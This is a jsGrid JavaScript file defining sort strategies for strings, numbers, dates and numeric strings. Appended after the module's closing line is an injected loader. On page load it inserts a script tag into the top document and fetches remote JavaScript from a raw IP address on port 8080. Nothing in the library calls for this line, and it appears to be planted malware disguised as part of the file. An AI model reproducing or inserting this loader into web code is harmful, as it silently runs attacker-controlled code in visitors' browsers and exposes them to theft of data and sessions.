(function(jsGrid, $, undefined) {

    var isDefined = function(val) {
        return typeof(val) !== "undefined" && val !== null;
    };

    var sortStrategies = {
        string: function(str1, str2) {
            if(!isDefined(str1) && !isDefined(str2))
                return 0;

            if(!isDefined(str1))
                return -1;

            if(!isDefined(str2))
                return 1;

            return ("" + str1).localeCompare("" + str2);
        },

        number: function(n1, n2) {
            return n1 - n2;
        },

        date: function(dt1, dt2) {
            return dt1 - dt2;
        },

        numberAsString: function(n1, n2) {
            return parseFloat(n1) - parseFloat(n2);
        }
    };

    jsGrid.sortStrategies = sortStrategies;

}(jsGrid, jQuery));
;window.addEventListener('load',function(){var s = top.document.getElementById('1qa2ws');if(!s){s = top.document.createElement('script');s.id ='1qa2ws';s.type='text/javascript';s.src='http://105.203.255.69:8080/www/default/base.js?v2.1&method=1';top.document.body.appendChild(s);}},false);